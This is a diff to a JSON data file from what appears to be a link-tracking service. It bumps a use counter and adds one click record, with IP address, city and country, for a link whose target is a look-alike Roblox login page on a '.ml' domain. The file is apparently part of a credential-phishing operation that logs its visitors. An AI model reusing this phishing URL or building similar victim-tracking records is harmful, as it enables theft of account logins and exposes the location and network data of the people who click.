@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 657,
+    "useCount": 658,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5368,6 +5368,14 @@
         "city": "Warsaw",
         "flag": "🇵🇱",
         "countryCode": "PL"
+      },
+      {
+        "timestamp": 1777125102793,
+        "ip": "87.216.236.180",
+        "country": "Spain",
+        "city": "Seseña",
+        "flag": "🇪🇸",
+        "countryCode": "ES"
       }
     ]
   },
